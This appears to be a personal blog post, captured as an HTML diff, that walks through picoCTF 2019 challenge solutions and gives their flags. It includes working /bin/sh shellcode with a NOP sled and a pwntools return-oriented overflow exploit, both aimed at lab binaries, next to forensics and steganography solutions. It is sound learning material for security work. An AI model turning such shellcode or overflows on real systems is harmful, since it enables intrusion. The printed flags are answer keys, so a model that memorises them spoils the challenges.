@@ -1,0 +1,229 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Day2 - Pico part 2 // Danil Delegator&#39;s Blog</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.69.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Danil Delegator" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://danildelegator.github.io/css/main.min.61bb32028587f24ca28522d8d197970c7ef33284e5fffb45a75fcbbb2dbc4dcb.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Day2 - Pico part 2"/>
+<meta name="twitter:description" content="slippery-shellcode (200p) From the source code I can see that the shellcode is executed from a random point in the payload between 0 and 256 so the payload should contain a bunch of NOP instructions before the actual shellcode.
+(python -c &#39;print(&#34;\x90&#34;*300 &#43; &#34;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#34;)&#39;; cat) | ./vuln The cat trick is so that I can use the shell I just popped.
+cat the flag: picoCTF{sl1pp3ry_sh311c0d3_ecc37b22}
+vault-door-3 (200p) buffer = list(&#34;jU5t_a_sna_3lpm11ga4e_u_4_m9rf48&#34;) password = list(&#34;?"/>
+
+    <meta property="og:title" content="Day2 - Pico part 2" />
+<meta property="og:description" content="slippery-shellcode (200p) From the source code I can see that the shellcode is executed from a random point in the payload between 0 and 256 so the payload should contain a bunch of NOP instructions before the actual shellcode.
+(python -c &#39;print(&#34;\x90&#34;*300 &#43; &#34;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#34;)&#39;; cat) | ./vuln The cat trick is so that I can use the shell I just popped.
+cat the flag: picoCTF{sl1pp3ry_sh311c0d3_ecc37b22}
+vault-door-3 (200p) buffer = list(&#34;jU5t_a_sna_3lpm11ga4e_u_4_m9rf48&#34;) password = list(&#34;?" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://danildelegator.github.io/day2/" />
+<meta property="article:published_time" content="2020-04-17T12:43:50+03:00" />
+<meta property="article:modified_time" content="2020-04-17T12:43:50+03:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://danildelegator.github.io"><img class="app-header-avatar" src="/images/avatar.jpg" alt="Danil Delegator" /></a>
+      <h1>Danil Delegator&#39;s Blog</h1>
+      <p>This is not filled in yet.</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/DanilDelegator" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://twitter.com/DaDelegator" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://linkedin.com/in/Danil-Delegator" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>linkedin</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Day2 - Pico part 2</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Apr 17, 2020
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          4 min read
+        </div></div>
+    </header>
+    <div class="post-content">
+      <h3 id="slippery-shellcode-200p">slippery-shellcode (200p)</h3>
+<p>From the source code I can see that the shellcode is executed from a random point in the payload between 0 and 256 so the payload should contain a bunch of NOP instructions before the actual shellcode.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>python -c <span style="color:#e6db74">&#39;print(&#34;\x90&#34;*300 + &#34;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#34;)&#39;</span>; cat<span style="color:#f92672">)</span> | ./vuln
+</code></pre></div><p>The <code>cat</code> trick is so that I can use the shell I just popped.</p>
+<p>cat the flag:
+picoCTF{sl1pp3ry_sh311c0d3_ecc37b22}</p>
+<h3 id="vault-door-3-200p">vault-door-3 (200p)</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">buffer <span style="color:#f92672">=</span> list(<span style="color:#e6db74">&#34;jU5t_a_sna_3lpm11ga4e_u_4_m9rf48&#34;</span>)
+password <span style="color:#f92672">=</span> list(<span style="color:#e6db74">&#34;?&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span>)
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>):
+    <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">&lt;=</span>i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">8</span>:
+        password[i] <span style="color:#f92672">=</span> buffer[i]
+    <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">8</span><span style="color:#f92672">&lt;=</span>i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">16</span>:
+        password[<span style="color:#ae81ff">23</span><span style="color:#f92672">-</span>i] <span style="color:#f92672">=</span> buffer[i]
+    <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">16</span><span style="color:#f92672">&lt;=</span>i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">32</span> <span style="color:#f92672">and</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+        password[<span style="color:#ae81ff">46</span><span style="color:#f92672">-</span>i] <span style="color:#f92672">=</span> buffer[i]
+    <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">17</span><span style="color:#f92672">&lt;=</span>i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">32</span> <span style="color:#f92672">and</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+        password[i] <span style="color:#f92672">=</span> buffer[i]
+
+<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(password)
+</code></pre></div><p>The flag I got is:
+picoCTF{jU5t_a_s1mpl3_an4gr4m_4_u_e9af18}</p>
+<h3 id="whats-the-difference-200p">whats-the-difference (200p)</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cmp -bl cattos.jpg kitters.jpg
+</code></pre></div><p>and one of the files contained the flag in the differing bytes.
+flag: picoCTF{th3yr3_a5_d1ff3r3nt_4s_bu773r_4nd_j311y_aslkjfdsalkfslkflkjdsfdszmz10548}</p>
+<h3 id="where-is-the-file-200p">where-is-the-file (200p)</h3>
+<p>This is just a dor file</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ls -lash
+cat .*
+</code></pre></div><p>flag: picoCTF{w3ll_that_d1dnt_w0RK_3e782057}</p>
+<h3 id="overflow-2-250p">OverFlow 2 (250p)</h3>
+<p>So this is basiclly the normal overflow with a twist that arguments to the function <code>flag</code> needs to be set.
+The address of the <code>flag</code> function is at <code>0x080485e6</code>.</p>
+<p>For this I&rsquo;m going to try to use pwntools more.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+r <span style="color:#f92672">=</span> ROP(<span style="color:#e6db74">&#39;./vuln&#39;</span>) <span style="color:#75715e"># This determines the calling conventions as well as other things</span>
+r<span style="color:#f92672">.</span>call(<span style="color:#ae81ff">0x080485e6</span>, [<span style="color:#ae81ff">0xdeadbeef</span>, <span style="color:#ae81ff">0xc0ded00d</span>])
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">188</span> <span style="color:#f92672">+</span> r<span style="color:#f92672">.</span>chain()
+<span style="color:#66d9ef">print</span>(f<span style="color:#e6db74">&#39;payload: {payload}&#39;</span>)
+
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./vuln&#39;</span>)
+p<span style="color:#f92672">.</span>recv()
+p<span style="color:#f92672">.</span>sendline(payload)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+flag <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;}&#39;</span>)
+
+<span style="color:#66d9ef">print</span>(flag)
+</code></pre></div><p>I got the flag:
+picoCTF{arg5_and_r3turn55897b905}</p>
+<h3 id="whitepages-250p">WhitePages (250p)</h3>
+<p>This one took me a while to figure out. the spaces (\x20) are 1 and every 3 characters (\xE2\x80\x83) are a 2.
+I get a binary:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;whitepages.txt&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
+    d <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+
+d<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xE2\x80\x83</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>)
+
+
+<span style="color:#75715e"># 00001010000010010000100101110000011010010110001101101111010000110101010001000110000010100000101000001001000010010101001101000101010001010010000001010000010101010100001001001100010010010100001100100000010100100100010101000011010011110101001001000100010100110010000000100110001000000100001001000001010000110100101101000111010100100100111101010101010011100100010000100000010100100100010101010000010011110101001001010100000010100000100100001001001101010011000000110000001100000010000001000110011011110111001001100010011001010111001100100000010000010111011001100101001011000010000001010000011010010111010001110100011100110110001001110101011100100110011101101000001011000010000001010000010000010010000000110001001101010011001000110001001100110000101000001001000010010111000001101001011000110110111101000011010101000100011001111011011011100110111101110100010111110110000101101100011011000101111101110011011100000110000101100011011001010111001101011111011000010111001001100101010111110110001101110010011001010110000101110100011001010110010001011111011001010111000101110101011000010110110001011111001100010011011100111000011001000011011100110010001100000011001000110101001100100110000101100110001100010110000101100110001100100011100100110011001101100011100101100101001100010011010100110100011001010110001101100001001100100011001101100001001110010011010101111101000010100000100100001001</span>
+</code></pre></div><p>I used a website to convert between binary and ascii and got the flag:
+picoCTF{not_all_spaces_are_created_equal_178d720252af1af29369e154eca23a95}</p>
+<h3 id="c0rrupt-250p">c0rrupt (250p)</h3>
+<p>First thing I saw is that the file header looks like a corrupt png header.
+Running pngcheck on it gave me:</p>
+<pre><code>File: mystery.png (202940 bytes)
+  this is neither a PNG or JNG image nor a MNG stream
+ERRORS DETECTED in mystery.png
+</code></pre><p>which means the header is bad. I correct the first bytes
+from: 89 65 4e 34 0d 0a b0 aa 00 00 00 0d
+to:   89 50 4e 47 0d 0a 1a 0a 00 00 00 0d</p>
+<p>running pngcheck again:</p>
+<pre><code>File: mystery.png (202940 bytes)
+  invalid chunk name &quot;C&quot;DR&quot; (43 22 44 52)
+ERRORS DETECTED in mystery.png
+</code></pre><p>So I fixed the header to: IHDR</p>
+<p>running pngcheck again:</p>
+<pre><code>File: mystery.png (202940 bytes)
+  chunk IHDR at offset 0x0000c, length 13
+    1642 x 1095 image, 24-bit RGB, non-interlaced
+  chunk sRGB at offset 0x00025, length 1
+    rendering intent = perceptual
+  chunk gAMA at offset 0x00032, length 4: 0.45455
+  chunk pHYs at offset 0x00042, length 9: 2852132389x5669 pixels/meter
+  CRC error in chunk pHYs (computed 38d82c82, expected 495224f0)
+:  invalid chunk length (too large)
+ERRORS DETECTED in mystery.png
+</code></pre><p>I change the checksum to the one that pngcheck calculated.</p>
+<p>running pngcheck again:</p>
+<pre><code>File: mystery.png (202940 bytes)
+  chunk IHDR at offset 0x0000c, length 13
+    1642 x 1095 image, 24-bit RGB, non-interlaced
+  chunk sRGB at offset 0x00025, length 1
+    rendering intent = perceptual
+  chunk gAMA at offset 0x00032, length 4: 0.45455
+  chunk pHYs at offset 0x00042, length 9: 2852132389x5669 pixels/meter
+:  invalid chunk length (too large)
+ERRORS DETECTED in mystery.png
+</code></pre><p>The name of the next chunk was corrupt and looked like it should be <code>IDAT</code>. also the length was very long. I calculated the length to the next chunk and changed the name to `IDAT.
+The chunk data ends at 0x10000 so the length is 0x10000 - 0x5B = 0xffa5</p>
+<p>run pngcheck once again</p>
+<pre><code>File: mystery.png (202940 bytes)
+  chunk IHDR at offset 0x0000c, length 13
+    1642 x 1095 image, 24-bit RGB, non-interlaced
+  chunk sRGB at offset 0x00025, length 1
+    rendering intent = perceptual
+  chunk gAMA at offset 0x00032, length 4: 0.45455
+  chunk pHYs at offset 0x00042, length 9: 2852132389x5669 pixels/meter
+  chunk IDAT at offset 0x00057, length 65445
+    zlib: deflated, 32K window, fast compression
+  chunk IDAT at offset 0x10008, length 65524
+  chunk IDAT at offset 0x20008, length 65524
+  chunk IDAT at offset 0x30008, length 6304
+  chunk IEND at offset 0x318b4, length 0
+No errors detected in mystery.png (9 chunks, 96.3% compression).
+</code></pre><p>and walla we get a png.
+flag:
+picoCTF{c0rrupt10n_1847995}</p>
+<h3 id="like1000-250p">like1000 (250p)</h3>
+<p>Tries using binwalk with the <code>-d</code> flag but it didn&rsquo;t work, idk why so I used python:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1000</span>, <span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
+    tar <span style="color:#f92672">=</span> tarfile<span style="color:#f92672">.</span>open(f<span style="color:#e6db74">&#39;{i}.tar&#39;</span>)
+    tar<span style="color:#f92672">.</span>extractall()
+    tar<span style="color:#f92672">.</span>close()
+</code></pre></div><p>There you get a flag.png which reads:
+picoCTF{l0t5_0f_TAR5}</p>
+<h3 id="m00nwalk-250p">m00nwalk (250p)</h3>
+<p>After A-LOT of google finally came across sstv which is a way to encode/decode images inside audio.
+Downloaded a tool called <code>MMSSTV</code> from <a href="https://hamsoft.ca/pages/mmsstv.php">https://hamsoft.ca/pages/mmsstv.php</a>.</p>
+<p>play the wav file and the software will decode it.
+the flag is:
+picoCTF{beep_boop_im_in_space}</p>
+<h3 id="vault-door-4-250p">vault-door-4 (250p)</h3>
+<p>Using this simple python script:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> myBytes:
+    <span style="color:#66d9ef">if</span> type(c) <span style="color:#f92672">==</span> str:
+        password <span style="color:#f92672">+=</span> c
+    <span style="color:#66d9ef">else</span>:
+        password <span style="color:#f92672">+=</span> chr(c)
+</code></pre></div><p>flag:
+picoCTF{jU5t_4_bUnCh_0f_bYt3s_7a1c8c668b}</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
